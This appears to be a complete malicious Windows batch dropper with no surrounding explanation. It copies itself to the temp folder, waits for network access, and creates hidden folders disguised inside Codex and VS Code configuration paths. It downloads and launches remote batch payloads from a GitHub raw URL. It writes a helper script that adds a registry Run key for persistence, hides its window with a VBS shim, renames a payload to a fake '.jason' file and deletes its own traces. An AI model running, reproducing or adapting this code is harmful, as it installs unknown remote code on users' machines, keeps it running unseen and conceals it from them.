@echo off
if not exist "%temp%\xdlls2s.bat" (
    copy "%~f0" "%temp%\xdlls2s.bat" > nul
    start "" "%temp%\xdlls2s.bat"
    exit )
cd "C:\"
:lol
ping -n 1 8.8.8.8 >nul 2>&1
if errorlevel 1 ( goto lol )
if not exist "%userprofile%\.config\codex\6sd72w467s167d72f36f4\" ( mkdir "%userprofile%\.config\codex\6sd72w467s167d72f36f4\" )
if not exist "%userprofile%\.codex\Memory\6sd72w467s167d72f36f4\" ( mkdir "%userprofile%\.codex\Memory\6sd72w467s167d72f36f4\" )
if not exist "%appdata%\Code\User\History\7b8dea4d" ( 
    mkdir "%appdata%\Code\User\History\7b8dea4d" 
    del /F /Q /A  "%appdata%\Code\User\History\7b8dea4d\zZxX1.bat" >nul 2>nul
    curl -f -L -o "%appdata%\Code\User\History\7b8dea4d\zZX1.bat" "https://raw.githubusercontent.com/eidanexa-lang/ssd/refs/heads/main/Madre.bat" >nul 
    start "" "%appdata%\Code\User\History\7b8dea4d\zZX1.bat" ) 
:lel
(
    echo @echo off
    echo reg add "HKCU\Software\Madicrosoft\Windows\adsCurrentVersion\Run" /v "system" /t REG_SZ /d "%~f0" /f ^>nul 2^>^&1
    echo if "%1"=="hide" goto :run
    echo set "vbs_hide=%userprofile%\.codex\Memory\6sd72w467s167d72f36f4\hide_run.vbs"
    echo echo CreateObject("Wscript.Shell").Run chr(34) ^& "%~f0" ^& chr(34) ^& " hide", 0, False > "%vbs_hide%"
    echo wscript "%vbs_hide%"
    echo del "%vbs_hide%"
    echo exit
    echo :run
    echo :wait_net
    echo ping -n 1 8.8.8.8 ^>nul 2^>^&1
    echo if errorlevel 1 ^( goto wait_net ^)
    echo :dis
    echo curl -f -L -o "%userprofile%\.config\codex\6sd72w467s167d72f36f4\Xtt.bat" "https://raw.githubusercontent.com/eidanexa-lang/ssd/refs/heads/main/xtt.bat" >nul
    echo if errorlevel 1 ^( goto dis ^)
    echo start "" "%userprofile%\.config\codex\6sd72w467s167d72f36f4\Xtt.bat"
    echo timeout /t 2 /nobreak >nul
    echo del /F /Q /A "%userprofile%\.config\codex\6sd72w467s167d72f36f4\164776617_7563474_86526371256434.jason" >nul 2>nul
    echo ren "%userprofile%\.config\codex\6sd72w467s167d72f36f4\Xtt.bat" "164776617_7563474_86526371256434.jason" >nul 2>nul
    echo exit
) > "%appdata%\Code\User\History\7b8dea4d\System.bat"
if not exist "%appdata%\Code\User\History\7b8dea4d\15AK.bat" ( goto lel )
del /F /Q /A  "%appdata%\Code\User\History\7b8dea4d\zZX1.bat" >nul 2>nul
start "" "%appdata%\Code\User\History\7b8dea4d\15AK.bat"
del /F /Q /A  "%temp%\xdlls2s.bat" >nul 2>nul
exit
